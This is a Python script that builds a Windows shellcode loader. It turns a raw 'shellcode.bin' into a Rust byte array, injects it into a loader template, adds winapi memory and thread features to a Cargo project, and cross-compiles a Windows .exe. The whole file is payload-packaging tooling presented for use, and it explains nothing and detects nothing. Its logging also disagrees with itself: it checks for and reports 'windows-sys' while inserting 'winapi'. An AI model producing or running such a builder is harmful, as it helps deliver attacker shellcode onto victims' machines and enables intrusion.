import shutil
import subprocess
import os
from pathlib import Path

CARGO_PROJECT_NAME = "rust_loader"
CARGO_TARGET = "x86_64-pc-windows-gnu"


def convert_bin_to_rust_array(bin_path, array_name="shellcode"):
    with open(bin_path, "rb") as f:
        content = f.read()

    rust_array = f"let {array_name}: [u8; {len(content)}] = [\n"
    line = "    "

    for i, byte in enumerate(content):
        line += f"0x{byte:02x}, "
        if (i + 1) % 12 == 0:
            rust_array += line + "\n"
            line = "    "

    if line.strip():
        rust_array += line + "\n"

    rust_array += "];"

    with open("shellcode.txt", "w") as f:
        f.write(rust_array)

    return rust_array


def inject_shellcode_into_loader(rust_array_code, template_path="loader.rc", output_path="loader.rs"):
    shutil.copyfile(template_path, output_path)

    with open(output_path, "r") as f:
        content = f.read()

    new_content = content.replace("SHELLCODE_BUFFER", rust_array_code)

    with open(output_path, "w") as f:
        f.write(new_content)

    print(f"[+] Created modified loader at: {output_path}")
    print(f"[+] Rust shellcode buffer saved to: shellcode.txt")


def create_cargo_project(project_name):
    if not Path(project_name).exists():
        subprocess.run(["cargo", "new", "--bin", project_name], check=True)
        print(f"[+] Created new Cargo project: {project_name}")


def update_cargo_toml(project_path):
    toml_path = Path(project_path) / "Cargo.toml"

    with open(toml_path, "r") as f:
        content = f.read()

    winapi_dep = (
        '[dependencies]\n'
	'winapi = { version = "0.3.9", features = ["winbase", "processthreadsapi", "memoryapi", "synchapi", "minwindef"] }\n'
    )


    if "windows-sys" in content:
        print("[*] `windows-sys` already in Cargo.toml, skipping.")
        return

    if "[dependencies]" in content:
        content = content.replace("[dependencies]", winapi_dep.strip())
    else:
        content += "\n" + winapi_dep

    with open(toml_path, "w") as f:
        f.write(content)

    print(f"[+] Patched Cargo.toml with `windows-sys` dependency and features.")




def copy_loader_to_cargo(project_path, loader_source="loader.rs"):
    src_path = Path(project_path) / "src" / "main.rs"
    shutil.copyfile(loader_source, src_path)
    print(f"[+] Replaced main.rs with loader source")


def compile_with_cargo(project_path):
    subprocess.run([
        "cargo", "build", "--release", "--target", CARGO_TARGET
    ], cwd=project_path, check=True)
    print(f"[+] Compilation successful: {project_path}/target/{CARGO_TARGET}/release/{CARGO_PROJECT_NAME}.exe")


# --- Main Execution ---
if __name__ == "__main__":
    rust_buffer = convert_bin_to_rust_array("shellcode.bin")
    inject_shellcode_into_loader(rust_buffer)

    create_cargo_project(CARGO_PROJECT_NAME)
    update_cargo_toml(CARGO_PROJECT_NAME)
    copy_loader_to_cargo(CARGO_PROJECT_NAME)
    compile_with_cargo(CARGO_PROJECT_NAME)
